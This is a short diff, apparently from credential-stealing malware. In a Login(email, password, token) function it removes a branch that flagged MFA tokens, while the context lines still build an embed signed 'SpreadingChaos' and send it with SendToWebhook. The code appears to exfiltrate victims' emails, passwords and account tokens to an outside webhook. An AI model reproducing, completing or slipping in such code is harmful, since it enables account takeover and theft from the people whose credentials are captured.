@@ -515,9 +515,6 @@ function Login(email, password, token) {
                                     "text": "SpreadingChaos"
                                 }
                             }
-                            if (token.startsWith("mfa")) {
-                                params.embeds.push(mfaembed)
-                            }
 
                             SendToWebhook(JSON.stringify(params))
 
